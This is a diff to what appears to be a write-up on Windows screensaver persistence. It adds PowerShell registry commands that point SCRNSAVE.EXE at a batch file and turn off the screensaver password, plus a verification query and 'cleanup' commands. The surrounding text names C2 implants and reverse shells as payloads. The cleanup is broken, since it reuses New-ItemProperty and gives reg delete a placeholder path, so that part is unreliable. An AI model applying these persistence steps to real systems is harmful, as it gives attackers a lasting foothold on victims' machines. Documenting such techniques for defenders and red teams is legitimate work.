@@ -54,6 +54,37 @@ echo @echo off > C:\Windows\Temp\pwn.bat
 echo msg %username% You are Pwned! >> C:\Windows\Temp\pwn.bat
 ```
 
+You may also use powershell script with below:
+
+```powershell
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveTimeOut' -Value '10'
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveActive' -Value '1'
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaverIsSecure' -Value '0'
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -Value 'C:\Windows\Temp\pwn.bat'
+```
+
+Once the registry changed, you may use command below to verify registry:
+
+```batch
+reg query "HKCU\Control Panel\Desktop" /s
+```
+
+If you want to remove the artifacts of registry, you can use powershell or normal dos command below:
+
+```powershell
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveTimeOut'
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveActive'
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaverIsSecure'
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE'
+```
+
+```batch
+reg delete /f Registry_key_path /v ScreenSaveTimeOut
+reg delete /f Registry_key_path /v ScreenSaveActive
+reg delete /f Registry_key_path /v ScreenSaverIsSecure
+reg delete /f Registry_key_path /v SCRNSAVE.EXE
+```
+
 Adversaries may use tools such as Sliver C2 implants/beacon, reverse shell from msfvenom or even simple socat/powershell to callback to attacker machines. Simply added line below to download the malicious executable and change the path of “SCRNSAVE.EXE“ to malicious executable.
 
 ```batch
